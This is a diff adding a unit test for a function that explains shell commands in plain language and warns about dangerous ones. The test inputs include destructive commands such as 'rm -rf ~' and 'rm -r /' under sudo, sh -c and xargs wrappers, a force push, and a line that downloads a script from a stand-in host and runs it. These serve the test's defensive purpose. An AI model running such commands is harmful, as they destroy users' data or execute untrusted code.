@@ -112,6 +112,31 @@ describe('explainCommand', () => {
     }
   })
 
+  it('sees through sudo options, escapes, wrappers, sh -c, xargs, +refspecs and process substitution', () => {
+    const home = 'Deletes your home folder and everything inside it.'
+    expect(explainCommand({ command: 'sudo -u bob rm -rf ~' })).toEqual([
+      'Runs with administrator rights.',
+      home,
+      SKIPS,
+    ])
+    expect(explainCommand({ command: '\\rm -r ~' })).toEqual([home])
+    expect(explainCommand({ command: 'command rm -r ~' })).toEqual([home])
+    expect(explainCommand({ command: 'bash -c "rm -rf ~"' })).toEqual([home, SKIPS])
+    expect(explainCommand({ command: "sh -c 'rm -r /'" })).toEqual([
+      'Deletes your whole disk and everything inside it.',
+    ])
+    expect(explainCommand({ command: 'ls | xargs rm -rf' })).toEqual([
+      'Deletes every file it is given and everything inside them.',
+      SKIPS,
+    ])
+    expect(explainCommand({ command: 'git push origin +main' })).toEqual([
+      "Replaces the remote branch, which can discard other people's work.",
+    ])
+    expect(explainCommand({ command: 'bash <(curl -s https://x.sh)' })).toEqual([
+      'Downloads a script and runs it straight away.',
+    ])
+  })
+
   it('explains each part of a chained command', () => {
     expect(explainCommand({ command: 'cd /tmp && rm -rf ~/' })).toEqual([
       'Deletes your home folder and everything inside it.',
